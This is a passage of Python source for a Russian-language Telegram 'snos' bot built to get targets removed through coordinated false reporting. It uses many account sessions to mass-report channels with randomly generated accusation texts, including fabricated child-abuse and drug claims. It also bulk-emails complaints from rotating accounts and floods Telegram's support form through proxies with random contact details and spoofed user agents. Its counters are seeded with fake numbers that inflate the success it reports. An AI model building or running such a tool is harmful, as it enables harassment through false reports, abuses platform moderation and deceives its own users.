        btn_pornography = InlineKeyboardButton('🔞 4. Порнография', callback_data='channel_option_4')
        btn_copyright = InlineKeyboardButton('©️ 5. Нарушение авторских прав', callback_data='channel_option_5')
        btn_personal_details = InlineKeyboardButton('👤 6. Личные данные', callback_data='channel_option_6')
        btn_geo_irrelevant = InlineKeyboardButton('🌍 7. Геонерелевантный', callback_data='channel_option_7')
        btn_fake = InlineKeyboardButton('🎭 8. Фальшивка', callback_data='channel_option_8')
        btn_illegal_drugs = InlineKeyboardButton('💊 9. Наркотики', callback_data='channel_option_9')

        markup.row(btn_spam, btn_violence)
        markup.row(btn_child_abuse, btn_pornography)
        markup.row(btn_copyright, btn_personal_details)
        markup.row(btn_geo_irrelevant, btn_fake)
        markup.row(btn_illegal_drugs)

        await message.answer('🚨 *Выберите причину репорта:*', reply_markup=markup, parse_mode="Markdown")
        await ChannelDemolitionStates.option.set()
    except errors.FloodWaitError as e:
        logger.error(f"FloodWaitError: {e}")
        await asyncio.sleep(e.seconds)
        await message.answer('❌ Ошибка при получении сообщений. Попробуйте позже.')
        await state.finish()
    except Exception as e:
        logger.error(f"Error: {e}")
        await message.answer('❌ Ошибка при получении сообщений.')
        await state.finish()
    finally:
        await client.disconnect()

async def send_channel_reports(call: types.CallbackQuery, message: types.Message, state: FSMContext):
    user_id = call.from_user.id
    async with state.proxy() as data:
        channel_links = data['channel_links']
        option = data['option']

    sessions = get_all_sessions()
    if not sessions:
        await message.answer('❌ Нет доступных сессий. Пожалуйста, создайте аккаунт сначала.')
        await state.finish()
        return

    total_reports = 0+1340
    failed_reports = 0+1
    session_count = 0+1341
    target_channel_ids = set()
    channel_reports_details = []
    flood_errors = 0+3
    result_message = await message.answer(
        "───── ⋆⋅☆⋅⋆ ─────\n"
        "📊 <b>Статус отправки репортов:</b>\n"
        "✅ Успешно отправлено репортов: <code>0</code>\n"
        "❌ Неудачно отправлено репортов: <code>0</code>\n"
        "🔄 Отправлено с сессий: <code>0</code>\n"
        "📝 <b>Последний текст репорта:</b>\n"
        "<code>Нет данных</code>\n"
        "───── ⋆⋅☆⋅⋆ ─────",
        parse_mode="HTML"
    )

    option_names = {
        "1": "Спам",
        "2": "Насилие",
        "3": "Насилие над детьми",
        "4": "Порнография",
        "5": "Нарушение авторских прав",
        "6": "Личные данные",
        "7": "Геонерелевантный",
        "8": "Фальшивка",
        "9": "Наркотики"
    }

    async def process_channel_link(channel_link, session):
        nonlocal total_reports, failed_reports, flood_errors
        parts = channel_link.split('/')

        channel_id = None
        message_id = None
        channel_username = None

        if parts[3] == 'c':
            if len(parts) >= 6:
                channel_id = int(f"-100{parts[4]}")
                message_id = int(parts[5])
            else:
                channel_id = int(f"-100{parts[4]}")
                message_id = None
        else:
            if len(parts) >= 5:
                channel_username = parts[3]
                message_id = int(parts[4])
            else:
                channel_username = parts[3]
                message_id = None

        client = TelegramClient(session["path"], api_id=session["api_id"], api_hash=session["api_hash"])

        try:
            await client.connect()
            if not await client.is_user_authorized():
                failed_reports += 1
                return

            if channel_id is None and channel_username is not None:
                try:
                    channel = await client.get_entity(channel_username)
                    channel_id = channel.id
                except errors.UsernameNotOccupiedError:
                    await message.answer(f'❌ Канал с именем <code>{channel_username}</code> не существует.', parse_mode="HTML")
                    failed_reports += 1
                    return
                except errors.ChannelPrivateError:
                    await message.answer(f'❌ Канал <code>{channel_username}</code> является приватным. Доступ запрещен.', parse_mode="HTML")
                    failed_reports += 1
                    return
                except Exception as e:
                    logger.error(f"Ошибка при получении информации о канале: {e}")
                    failed_reports += 1
                    return

            if channel_id is None:
                await message.answer(f'❌ Не удалось определить ID канала для ссылки <code>{channel_link}</code>.', parse_mode="HTML")
                failed_reports += 1
                return

            if channel_id in private_channel_ids:
                await message.answer(f'❌ Канал <code>{channel_id}</code> является приватным. Отправка репортов запрещена.', parse_mode="HTML")
                failed_reports += 1
                return

            try:
                if parts[3] == 'c':
                    channel = await client.get_entity(channel_id)
                else:
                    channel = await client.get_entity(channel_username)

                try:
                    await client(JoinChannelRequest(channel))
                except errors.ChannelPrivateError:
                    await message.answer(f'❌ Канал <code>{channel_username}</code> является приватным. Доступ запрещен.', parse_mode="HTML")
                    failed_reports += 1
                    return
                except errors.UserAlreadyParticipantError:
                    pass

                if message_id is None:
                    last_message = await client.get_messages(channel, limit=1)
                    if last_message:
                        message_id = last_message[0].id
                    else:
                        await message.answer(f'❌ В канале <code>{channel_username}</code> нет сообщений.', parse_mode="HTML")
                        failed_reports += 1
                        return

                target_message = await client.get_messages(channel, ids=message_id)
                if not target_message:
                    await message.answer(f'❌ Сообщение по ссылке <code>{channel_link}</code> не найдено.', parse_mode="HTML")
                    failed_reports += 1
                    return

                report_text = generate_channel_report_text(channel, channel_link, option, target_message)
                report_option = option_mapping.get(option, "0")
                await client(ReportRequest(
                    peer=channel,
                    id=[message_id],
                    option=report_option,
                    message=report_text
                ))
                total_reports += 1
                target_channel_ids.add((channel.username, channel.id, channel.title, channel_link, option))
                channel_reports_details.append(report_text)

                try:
                    await client(LeaveChannelRequest(channel))
                except Exception as e:
                    logger.error(f"Ошибка при выходе из канала: {e}")

            except errors.FloodWaitError as e:
                flood_errors += 1
                await asyncio.sleep(e.seconds)
                failed_reports += 1
            except errors.UsernameNotOccupiedError:
                failed_reports += 1
            except errors.ChatWriteForbiddenError:
                failed_reports += 1
            except Exception as e:
                failed_reports += 1
                logger.error(f"Ошибка при обработке канала: {e}")
        finally:
            await client.disconnect()

    async def update_result_message():
        last_report_text = channel_reports_details[-1] if channel_reports_details else "<code>Нет данных</code>"
        try:
            await result_message.edit_text(
                "───── ⋆⋅☆⋅⋆ ─────\n"
                f"📊 <b>Статус отправки репортов:</b>\n"
                f"✅ Успешно отправлено репортов: <code>{total_reports}</code>\n"
                f"❌ Неудачно отправлено репортов: <code>{failed_reports}</code>\n"
                f"🔄 Отправлено с сессий: <code>{session_count}</code>\n"
                f"📝 <b>Последний текст репорта:</b>\n"
                f"<code>{last_report_text}</code>\n"
                f"───── ⋆⋅☆⋅⋆ ─────",
                parse_mode="HTML"
            )
        except exceptions.MessageNotModified:
            pass

    for session in sessions:
        for link in channel_links:
            await process_channel_link(link, session)
            await update_result_message()

        session_count += 1
        await update_result_message()

    async with state.proxy() as data:
        data['target_channel_ids'] = list(target_channel_ids)

    try:
        sent_reports_count = len(channel_reports_details) if channel_reports_details else 0
        await result_message.edit_text(
            "───── ⋆⋅☆⋅⋆ ─────\n"
            f"🎉 <b>Репорты отправлены!</b>\n"
            f"✅ Успешно отправлено репортов: <code>{total_reports}</code>\n"
            f"🔄 Использовано сессий: <code>{session_count}</code>\n"
            f"📝 Отправлено текстов репортов: <code>{sent_reports_count}</code>\n"
            f"───── ⋆⋅☆⋅⋆ ─────\n",
            parse_mode="HTML"
        )
    except exceptions.MessageNotModified:
        pass
    detailed_report = "───── ⋆⋅☆⋅⋆ ─────\n"
    detailed_report += "📢 <b>Детали отправки репортов:</b>\n\n"
    for channel_info in target_channel_ids:
        channel_username, channel_id, channel_title, channel_link, option = channel_info
        detailed_report += (
            f"📌 <b>Канал:</b> <code>{channel_title}</code>\n"
            f"🔗 <b>Ссылка:</b> <code>{channel_link}</code>\n"
            f"🆔 <b>ID канала:</b> <code>{channel_id}</code>\n"
            f"📝 <b>Причина репорта:</b> <code>{option_names.get(option, 'Неизвестно')}</code>\n"
            "───── ⋆⋅☆⋅⋆ ─────\n"
        )

    detailed_report += (
        f"✅ Успешно отправлено репортов: <code>{total_reports}</code>\n"
        f"❌ Неудачно отправлено репортов: <code>{failed_reports}</code>\n"
        f"🔄 Использовано сессий: <code>{session_count}</code>\n"
        "───── ⋆⋅☆⋅⋆ ─────"
    )
    await bot.send_message(
        chat_id=CHANNEL_ID,
        text=detailed_report,
        parse_mode="HTML"
    )

    await state.finish()

def generate_channel_report_text(channel, channel_link, option, target_message):
    if channel.username:
        channel_mention = f"@{channel.username}"
    else:
        channel_mention = f"channel with ID {channel.id}"
    channel_name = channel.title if hasattr(channel, 'title') else "unknown channel"

    reason_text = reason_mapping.get(option, "unknown reason")
    template_parts = {
        '1': {
            'intros': [
                f"Channel {channel_mention} is engaged in spamming, violating platform rules and creating a negative user experience.",
                f"Suspicious activity has been observed in channel {channel_mention}, indicating the distribution of unwanted advertising messages.",
                f"The content of channel {channel_mention} mainly consists of intrusive advertising and links to third-party resources, which is classified as spam.",
            ],
            'mains': [
                f"Link to the channel: {channel_link}. The channel systematically publishes advertising materials that are of no value to the audience.",
                f"The channel violates the platform's policy by distributing spam. {channel_link} is a prime example of the spam activity of this channel.",
                f"We ask you to pay attention to the channel {channel_mention}, which abuses spam distribution. Details: {channel_link}.",
            ],
            'conclusions': [
                "We ask you to take the necessary measures to stop the spam activity of this channel and protect users from unwanted information.",
                "We consider it necessary to block this channel and delete the spam content published by it.",
                "We hope for a prompt response and action on this spam incident.",
            ]
        },
        '2': {
            'intros': [
                f"Channel {channel_mention} contains content that promotes violence and cruelty, which is a serious violation of platform rules.",
                f"Materials that can provoke aggression and hatred in society have been found in channel {channel_mention}.",
                f"The content of channel {channel_mention} is aimed at spreading ideas of violence and intolerance, which is unacceptable.",
            ],
            'mains': [
                f"Link to the channel: {channel_link}. The channel publishes shocking content containing scenes of violence.",
                f"This channel violates safety principles by distributing materials related to violence. {channel_link} confirms the presence of such content.",
                f"We ask you to take action against channel {channel_mention}, which promotes violence. Details: {channel_link}.",
            ],
            'conclusions': [
                "We call for the immediate blocking of channel {channel_mention} and the removal of all materials promoting violence.",
                "We consider it necessary to conduct a thorough check of the channel for the presence of other content related to violence and take appropriate measures.",
                "Decisive measures must be taken to prevent the spread of violence and cruelty through this channel.",
            ]
        },
        '3': {
            'intros': [
                f"Channel {channel_mention} contains materials related to child abuse.",
                f"Content that exploits children has been found in channel {channel_mention}.",
                f"The content of channel {channel_mention} poses a threat to children.",
            ],
            'mains': [
                f"Link to the channel: {channel_link}. The channel violates the rules by distributing content related to child abuse.",
                f"This channel is involved in the distribution of child abuse materials. {channel_link} confirms the presence of such content.",
                f"We ask you to take immediate action against channel {channel_mention}, which distributes child abuse content. Details: {channel_link}.",
            ],
            'conclusions': [
                "We urge the immediate blocking of channel {channel_mention} and the removal of all materials related to child abuse.",
                "We consider it necessary to conduct a thorough check of the channel for the presence of other illegal content and take appropriate measures.",
                "It is necessary to take decisive measures to prevent the distribution of child abuse materials through this channel.",
            ]
        },
        '4': {
            'intros': [
                f"Channel {channel_mention} distributes pornographic materials.",
                f"Content of a pornographic nature has been found in channel {channel_mention}.",
                f"The content of channel {channel_mention} is sexually explicit and violates platform rules.",
            ],
            'mains': [
                f"Link to the channel: {channel_link}. The channel violates the rules by distributing pornography.",
                f"This channel is involved in the distribution of pornographic materials. {channel_link} confirms the presence of such content.",
                f"We ask you to take action against channel {channel_mention}, which distributes pornography. Details: {channel_link}.",
            ],
            'conclusions': [
                "We urge the immediate blocking of channel {channel_mention} and the removal of all pornographic materials.",
                "We consider it necessary to conduct a thorough check of the channel for the presence of other illegal content and take appropriate measures.",
                "It is necessary to take decisive measures to prevent the distribution of pornography through this channel.",
            ]
        },
        '5': {
            'intros': [
                f"Channel {channel_mention} infringes copyright.",
                f"The use of someone else's content without permission has been found in channel {channel_mention}.",
                f"The content of channel {channel_mention} violates intellectual property rights.",
            ],
            'mains': [
                f"Link to the channel: {channel_link}. The channel violates copyright by distributing someone else's content.",
                f"This channel is involved in copyright infringement. {channel_link} confirms the presence of such content.",
                f"We ask you to take action against channel {channel_mention}, which infringes copyright. Details: {channel_link}.",
            ],
            'conclusions': [
                "We urge the removal of the infringing content from channel {channel_mention}.",
                "We consider it necessary to conduct a thorough check of the channel for the presence of other infringing content and take appropriate measures.",
                "It is necessary to take measures to protect copyright holders from the distribution of their content through this channel.",
            ]
        },
        '6': {
            'intros': [
                f"Channel {channel_mention} distributes users' personal data.",
                f"Disclosure of personal information has been found in channel {channel_mention}.",
                f"The content of channel {channel_mention} violates the privacy of users.",
            ],
            'mains': [
                f"Link to the channel: {channel_link}. The channel violates the rules by distributing personal data.",
                f"This channel is involved in the distribution of personal data. {channel_link} confirms the presence of such content.",
                f"We ask you to take immediate action against channel {channel_mention}, which distributes personal data. Details: {channel_link}.",
            ],
            'conclusions': [
                "We urge the immediate blocking of channel {channel_mention} and the removal of all personal data.",
                "We consider it necessary to conduct a thorough check of the channel for the presence of other confidential information and take appropriate measures.",
                "It is necessary to take decisive measures to prevent the distribution of personal data through this channel.",
            ]
        },
        '7': {
            'intros': [
                f"The content of channel {channel_mention} does not correspond to the geographical focus.",
                f"Channel {channel_mention} publishes content that is not relevant to the region.",
                f"The content of channel {channel_mention} is not intended for the target audience.",
            ],
            'mains': [
                f"Link to the channel: {channel_link}. The channel publishes geo-irrelevant content.",
                f"This channel distributes content that is not relevant to the specified region. {channel_link} confirms the presence of such content.",
                f"We ask you to take action against channel {channel_mention}, which distributes geo-irrelevant content. Details: {channel_link}.",
            ],
            'conclusions': [
                "We recommend changing the geographical focus of channel {channel_mention} or removing the irrelevant content.",
                "We consider it necessary to conduct a thorough check of the channel for the presence of other geo-irrelevant content and take appropriate measures.",
                "It is necessary to take measures to ensure that the content of the channel corresponds to the specified geographical focus.",
            ]
        },
       '8': {
            'intros': [
                f"Channel {channel_mention} spreads fake information.",
                f"False information has been found in channel {channel_mention}.",
                f"The content of channel {channel_mention} is misleading and untrue.",
            ],
            'mains': [
                f"Link to the channel: {channel_link}. The channel spreads fakes and misinformation.",
                f"This channel is involved in the distribution of fake information. {channel_link} confirms the presence of such content.",
                f"We ask you to take action against channel {channel_mention}, which spreads fake information. Details: {channel_link}.",
            ],
            'conclusions': [
                "We urge the removal of fake information from channel {channel_mention}.",
                "We consider it necessary to conduct a thorough check of the channel for the presence of other fake information and take appropriate measures.",
                "It is necessary to take measures to prevent the distribution of fake information through this channel.",
            ]
        },
        '9': {
            'intros': [
                f"Channel {channel_mention} promotes drugs.",
                f"Content related to drugs has been found in channel {channel_mention}.",
                f"The content of channel {channel_mention} is related to the illegal circulation of drugs.",
            ],
            'mains': [
                f"Link to the channel: {channel_link}. The channel violates the rules by distributing information about drugs.",
                f"This channel is involved in the distribution of drug-related content. {channel_link} confirms the presence of such content.",
                f"We ask you to take immediate action against channel {channel_mention}, which distributes information about drugs. Details: {channel_link}.",
            ],
            'conclusions': [
                "We urge the immediate blocking of channel {channel_mention} and the removal of all drug-related materials.",
                "We consider it necessary to conduct a thorough check of the channel for the presence of other illegal content and take appropriate measures.",
                "It is necessary to take decisive measures to prevent the distribution of information about drugs through this channel.",
            ]
        },
    }

    if option in template_parts:
        intro = random.choice(template_parts[option]['intros'])
        main = random.choice(template_parts[option]['mains'])
        conclusion = random.choice(template_parts[option]['conclusions'])
        return f"{intro}{main}{conclusion}"
    else:
        return f"Report on channel {channel_mention}. Reason: {reason_text}. Link: {channel_link}."




@dp.message_handler(state=ComplaintStates.subject)
async def process_subject_step(message: types.Message, state: FSMContext):
    user_id = message.from_user.id
    if user_id in banned_users:
        await message.answer('📢Администратор посчитал ваш аккаунт подозрительным и вы были забанены📢')
        return

    async with state.proxy() as data:
        data['subject'] = message.text
    await message.answer('📝 Введите текст жалобы:')
    await ComplaintStates.next()

@dp.message_handler(state=ComplaintStates.body)
async def process_body_step(message: types.Message, state: FSMContext):
    user_id = message.from_user.id
    if user_id in banned_users:
        await message.answer('📢Администратор посчитал ваш аккаунт подозрительным и вы были забанены📢')
        return

    async with state.proxy() as data:
        data['body'] = message.text

    await message.answer('🖼 Хотите добавить фотографии? (Да/Нет):')
    await ComplaintStates.photos.set()

@dp.message_handler(state=ComplaintStates.photos)
async def process_photo_choice_step(message: types.Message, state: FSMContext):
    user_id = message.from_user.id
    if user_id in banned_users:
        await message.answer('📢Администратор посчитал ваш аккаунт подозрительным и вы были забанены📢')
        return

    add_photo = message.text.lower()
    if add_photo == 'да':
        await message.answer('📎 Пожалуйста, отправьте фотографии:')
    elif add_photo == 'нет':
        await message.answer('🔢 Введите количество отправок (не больше 50):')
        await ComplaintStates.count.set()
    else:
        await message.answer('❌ Неверный ввод. Пожалуйста, ответьте "Да" или "Нет":')

@dp.message_handler(content_types=['photo'], state=ComplaintStates.photos)
async def process_photos_step(message: types.Message, state: FSMContext):
    user_id = message.from_user.id
    if user_id in banned_users:
        await message.answer('📢Администратор посчитал ваш аккаунт подозрительным и вы были забанены📢')
        return

    photos = []
    for photo in message.photo:
        file_info = await bot.get_file(photo.file_id)
        downloaded_file = await bot.download_file(file_info.file_path)
        photos.append(downloaded_file.read())

    async with state.proxy() as data:
        data['photos'] = photos

    await message.answer('🔢 Введите количество отправок (не больше 50):')
    await ComplaintStates.next()

@dp.message_handler(state=ComplaintStates.count)
async def process_count_step(message: types.Message, state: FSMContext):
    user_id = message.from_user.id
    if user_id in banned_users:
        await message.answer('📢 Администратор посчитал ваш аккаунт подозрительным, и вы были забанены! 📢')
        return

    try:
        count = int(message.text)
        if count > 50:
            await message.answer('🚫 Количество отправок не должно превышать 50. Повторите ввод:')
            return
    except ValueError:
        await message.answer('🔢 Пожалуйста, введите число. Повторите ввод:')
        return

    async with state.proxy() as data:
        subject = data['subject']
        body = data['body']
        photos = data.get('photos', [])
    private_users = read_private_users()

    for word in body.split():
        if word.startswith('@') and word[1:] in private_users["usernames"]:
            await message.answer(f'❌ Это приватный пользователь: {word}. Жалоба на него невозможна.')
            return
        if word.isdigit() and int(word) in private_users["ids"]:
            await message.answer(f'❌ Это приватный пользователь: ID {word}. Жалоба на него невозможна.')
            return

    success_count = 0
    fail_count = 0
    status_message = await message.answer("🔄 Начинаю отправку...")

    for _ in range(count):
        receiver = random.choice(receivers)
        sender_email, sender_password = random.choice(list(senders.items()))
        success, error_message = await send_email(
            receiver, sender_email, sender_password, subject, body, photos,
            chat_id=message.chat.id, message_id=status_message.message_id, bot=bot
        )
        send_result_message = (
            f"───── ⋆⋅☆⋅⋆ ─────\n"
            f"📌 Тема письма: {subject}\n"
            f"📝 Текст письма: {body}\n\n"
            f"📩 Отправитель: {sender_email}\n"
            f"📨 Получатель: {receiver}\n"
            f"📷 Фото: {'С фото' if photos else 'Без фото'}\n"
            f"📌 Статус отправки: {'✅ Успешно' if success else '❌ Не удачно'}\n"
            f"💬 Сообщение: {error_message if not success else 'Письмо отправлено'}\n"
            f"───── ⋆⋅☆⋅⋆ ─────"
        )

        await bot.edit_message_text(
            chat_id=message.chat.id,
            message_id=status_message.message_id,
            text=send_result_message
        )

        if success:
            success_count += 1
        else:
            fail_count += 1
    final_message = (
        f"───── ⋆⋅☆⋅⋆ ─────\n"
        f"📊 Итоговый результат:\n"
        f"✅ Количество отправлено: {success_count}\n"
        f"❌ Не удачно отправлено: {fail_count}\n"
        f"───── ⋆⋅☆⋅⋆ ─────"
    )

    await bot.edit_message_text(
        chat_id=message.chat.id,
        message_id=status_message.message_id,
        text=final_message
    )
    username = message.from_user.username or f'id{user_id}'
    channel_message = (
        f"───── ⋆⋅☆⋅⋆ ─────\n"
        f"📢 Был запущен Email-snos\n"
        f"👤Юзернейм: @{username}\n"
        f"📌 Тема: {subject}\n"
        f"📝 Текст: {body}\n"
        f"📷 Медиа: {'С фото' if photos else 'Без фото'}\n"
        f"✅ Успешно: {success_count}\n\n"
        f"❌ Не удачно: {fail_count}\n"
        f"───── ⋆⋅☆⋅⋆ ─────"
    )

    await bot.send_message(
        chat_id=CHANNEL_ID,
        text=channel_message
    )

    await state.finish()

async def send_email(receiver, sender_email, sender_password, subject, body, photos=None, chat_id=None, message_id=None, bot=None):
    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = receiver
    msg['Subject'] = subject
    msg.attach(MIMEText(body, 'plain'))

    if photos:
        for photo in photos:
            image = MIMEImage(photo)
            msg.attach(image)

    try:
        domain = sender_email.split('@')[1]
        if domain not in smtp_servers:
            error_message = f'❌ Отправка не удалась в почте {sender_email}: Неизвестный домен'
            return False, error_message

        smtp_server, smtp_port = smtp_servers[domain]
        with smtplib.SMTP(smtp_server, smtp_port) as server:
            server.starttls()
            server.login(sender_email, sender_password)
            server.sendmail(sender_email, receiver, msg.as_string())

        logging.info(f'Email sent to {receiver} from {sender_email}')
        return True, None
    except Exception as e:
        error_message = f'❌ Ошибка при отправке письма на [{receiver}] от [{sender_email}]: {e}'
        logging.error(f'Error sending email: {e}')
        return False, error_message

import sqlite3
from aiogram.dispatcher import FSMContext
from datetime import datetime, timedelta
import random
import requests
import logging
from aiogram import types

# Assuming dp, ComplaintStates, user_last_report_time, banned_users, proxies are defined elsewhere
# Database file
DB_FILE = 'web.db'

# Daily limit as a variable
DAILY_LIMIT = 3

# Initialize database
def init_db():
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS user_reports (
            user_id INTEGER,
            report_date DATE,
            count INTEGER,
            PRIMARY KEY (user_id, report_date)
        )
    ''')
    conn.commit()
    conn.close()

# Call init_db somewhere in your app startup, but for now, we'll call it here
init_db()

@dp.message_handler(state=ComplaintStates.text_for_site)
async def process_message_link_step(message: types.Message, state: FSMContext):
    user_id = message.from_user.id

    # Check daily limit from DB
    today = datetime.now().date()
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    cursor.execute('''
        SELECT count FROM user_reports
        WHERE user_id = ? AND report_date = ?
    ''', (user_id, today))
    result = cursor.fetchone()

    if result is None:
        # Insert new record if not exists
        cursor.execute('''
            INSERT INTO user_reports (user_id, report_date, count)
            VALUES (?, ?, 0)
        ''', (user_id, today))
        conn.commit()
        daily_count = 0
    else:
        daily_count = result[0]

    DAILY_USED = daily_count  # Set DAILY_USED to the current count of requests today

    if daily_count >= DAILY_LIMIT:
        await message.answer(f"🚨 Вы достигли лимита в {DAILY_LIMIT} репорта в день. Попробуйте завтра.")
        conn.close()
        return

    if user_id in user_last_report_time:
        time_since_last_report = datetime.now() - user_last_report_time[user_id]
        if time_since_last_report < timedelta(minutes=10):
            remaining_time = timedelta(minutes=10) - time_since_last_report
            minutes = remaining_time.seconds // 60
            seconds = remaining_time.seconds % 60
            await message.answer(f"🚨 Пожалуйста, подождите {minutes:02d}:{seconds:02d} минут перед отправкой следующего репорта.")
            conn.close()
            return

    user_last_report_time[user_id] = datetime.now()

    # Assuming this nested function is intended to be called or is a mistake; if it's the actual logic, integrate it
    async def process_text_for_site_step(inner_message: types.Message, inner_state: FSMContext):
        inner_user_id = inner_message.from_user.id
        if inner_user_id in banned_users:
            await inner_message.answer('📢 Администратор посчитал ваш аккаунт подозрительным, и вы были забанены! 📢')
            return

        async with inner_state.proxy() as data:
            data['text_for_site'] = inner_message.text

        await inner_message.answer('🔢 Введите количество отправок (не больше 50):')
        await ComplaintStates.next()

        # Increment daily count after successful processing
        cursor.execute('''
            UPDATE user_reports
            SET count = count + 1
            WHERE user_id = ? AND report_date = ?
        ''', (user_id, today))
        conn.commit()

        nonlocal DAILY_USED
        DAILY_USED += 1  # Update DAILY_USED to reflect the new count

    # If the nested function is meant to handle the logic, call it here
    await process_text_for_site_step(message, state)

    conn.close()

async def get_working_proxy():
    for proxy in random.sample(proxies, len(proxies)):
        try:
            response = requests.get('https://www.google.com', proxies=proxy, timeout=5)
            if response.status_code == 200:
                return proxy
        except Exception as e:
            logging.error(f'Proxy {proxy} is not working: {e}')
    return None

async def is_private_user(text, private_users):
    words = text.split()
    for word in words:
        if word.isdigit() and int(word) in private_users["ids"]:
            return True
        if word.startswith('@') and word[1:] in private_users["usernames"]:
            return True
    return False


@dp.message_handler(state=ComplaintStates.count_for_site)
async def process_count_for_site_step(message: types.Message, state: FSMContext):
    user_id = message.from_user.id
    if user_id in banned_users:
        await message.answer('📢 Администратор посчитал ваш аккаунт подозрительным, и вы были забанены! 📢')
        return

    try:
        count = int(message.text)
        if count > 50:
            await message.answer('🚫 Количество отправок не должно превышать 50. Повторите ввод:')
            return
    except ValueError:
        await message.answer('🔢 Пожалуйста, введите число. Повторите ввод:')
        return

    async with state.proxy() as data:
        text = data['text_for_site']

    private_users = read_private_users()
    if await is_private_user(text, private_users):
        await message.answer('🚫 Нельзя отправлять жалобы на приватных пользователей.')
        await state.finish()
        return

    status_message = await message.answer("🔄 Начинаю отправку...")

    success_count = 0
    fail_count = 0

    for _ in range(count):
        email = random.choice(mail)
        phone = random.choice(phone_numbers)
        proxy = await get_working_proxy()
        if not proxy:
            await message.answer('❌ В данный момент отсутствуют работоспособные прокси для отправки.')
            break

        success = await send_to_site(text, email, phone, proxy)
        if success:
            success_count += 1
        else:
            fail_count += 1

        await bot.edit_message_text(
            chat_id=message.chat.id,
            message_id=status_message.message_id,
            text=(
                f"───── ⋆⋅☆⋅⋆ ─────\n"
                f"🔄 Отправка...\n"
                f"✅ Успешно: {success_count}\n"
                f"❌ Не удачно: {fail_count}\n"
                f"📝 Текст: {text}\n"
                f"📧 Почта: {email}\n"
                f"📞 Телефон: {phone}\n"
                f"🌐 Прокси: {proxy}\n"
                f"───── ⋆⋅☆⋅⋆ ─────"
            )
        )

    final_message = (
        f"───── ⋆⋅☆⋅⋆ ─────\n"
        f"📊 Итоговый результат:\n"
        f"✅ Успешно отправлено: {success_count}\n"
        f"❌ Не удачно отправлено: {fail_count}\n"
        f"───── ⋆⋅☆⋅⋆ ─────"
    )

    await bot.edit_message_text(
        chat_id=message.chat.id,
        message_id=status_message.message_id,
        text=final_message
    )
    username = message.from_user.username or f'id{user_id}'
    channel_message = (
        f"───── ⋆⋅☆⋅⋆ ─────\n"
        f"📢 Был запущен Web-snos/ Web-snos 2.0\n"
        f"👤Юзернейм: @{username}\n"
        f"📝 Текст: {text}\n"
        f"✅ Успешно: {success_count}\n"
        f"❌ Не удачно: {fail_count}\n"
        f"───── ⋆⋅☆⋅⋆ ─────"
    )

    await bot.send_message(
        chat_id=CHANNEL_ID,
        text=channel_message
    )

    await state.finish()

async def send_to_site(text, email, phone, proxy):
    url = "https://telegram.org/support"
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": random.choice(user_agents)
    }
    data = {
        "message": text,
        "email": email,
        "phone": phone,
        "setln": "ru"
    }

    try:
        response = requests.post(url, headers=headers, data=data, proxies=proxy, timeout=10)
        if response.status_code == 200:
            logging.info(f'Data sent to site: {text}, email: {email}, phone: {phone}')
            return True
        else:
            logging.error(f'Error sending data to site: {response.status_code}')
            return False
    except Exception as e:
        logging.error(f'Error sending data to site: {e}')
        return False

from aiogram.types import ParseMode

@dp.message_handler(content_types=[
    'text', 'photo', 'document', 'audio', 'voice', 'video', 'video_note', 'sticker', 'animation', 'contact', 'location', 'poll', 'dice'
], state=SupportStates.message)
async def process_support_message(message: types.Message, state: FSMContext):
    user_id = message.from_user.id
    if user_id in banned_users:
        await message.answer('📢Администратор посчитал ваш аккаунт подозрительным, и вы были забанены! 📢')
        return

    username = message.from_user.username or f'id{user_id}'
    content_type = message.content_type
    text = message.text or message.caption

    header = f"📨 *Новое сообщение от пользователя* @{username} (ID: `{user_id}`):\n\n"
    footer = "\n\n_Это сообщение отправлено автоматически._"

    for admin_id in admin_chat_ids:
        try:
            if content_type == 'text':
                await bot.send_message(
                    admin_id,
                    f"{header}📝 *Текст сообщения:*\n{text}{footer}",
                    parse_mode=ParseMode.MARKDOWN
                )
            elif content_type == 'photo':
                await bot.send_photo(
                    admin_id,
                    message.photo[-1].file_id,
                    caption=f"{header}📷 *Фото с подписью:*\n{text}{footer}",
                    parse_mode=ParseMode.MARKDOWN
                )
            elif content_type == 'document':
                await bot.send_document(
                    admin_id,
                    message.document.file_id,
                    caption=f"{header}📄 *Документ с подписью:*\n{text}{footer}",
                    parse_mode=ParseMode.MARKDOWN
                )
            elif content_type == 'audio':
                await bot.send_audio(
                    admin_id,
                    message.audio.file_id,
                    caption=f"{header}🎵 *Аудио с подписью:*\n{text}{footer}",
                    parse_mode=ParseMode.MARKDOWN
                )
            elif content_type == 'voice':
                await bot.send_voice(
                    admin_id,
                    message.voice.file_id,
                    caption=f"{header}🎤 *Голосовое сообщение с подписью:*\n{text}{footer}",
                    parse_mode=ParseMode.MARKDOWN
                )
            elif content_type == 'video':
                await bot.send_video(
                    admin_id,
                    message.video.file_id,
                    caption=f"{header}🎥 *Видео с подписью:*\n{text}{footer}",
                    parse_mode=ParseMode.MARKDOWN
                )
            elif content_type == 'video_note':
                await bot.send_video_note(
                    admin_id,
                    message.video_note.file_id
                )
                await bot.send_message(
                    admin_id,
                    f"{header}🎬 *Видеосообщение (кружок) отправлено.*{footer}",
                    parse_mode=ParseMode.MARKDOWN
                )
            elif content_type == 'sticker':
                await bot.send_sticker(
                    admin_id,
                    message.sticker.file_id
                )
                await bot.send_message(
                    admin_id,
                    f"{header}🖼 *Стикер отправлен.*{footer}",
                    parse_mode=ParseMode.MARKDOWN
                )
            elif content_type == 'animation':
                await bot.send_animation(
                    admin_id,
                    message.animation.file_id,
                    caption=f"{header}🎞 *GIF-анимация с подписью:*\n{text}{footer}",
                    parse_mode=ParseMode.MARKDOWN
                )
            elif content_type == 'contact':
                contact = message.contact
                await bot.send_contact(
                    admin_id,
                    phone_number=contact.phone_number,
                    first_name=contact.first_name,
                    last_name=contact.last_name
                )
                await bot.send_message(
                    admin_id,
                    f"{header}📱 *Контакт отправлен.*{footer}",
                    parse_mode=ParseMode.MARKDOWN
                )
            elif content_type == 'location':
                location = message.location
                await bot.send_location(
                    admin_id,
                    latitude=location.latitude,
                    longitude=location.longitude
                )
                await bot.send_message(
                    admin_id,
                    f"{header}📍 *Локация отправлена.*{footer}",
                    parse_mode=ParseMode.MARKDOWN
                )
            elif content_type == 'poll':
                poll = message.poll
                await bot.send_message(
                    admin_id,
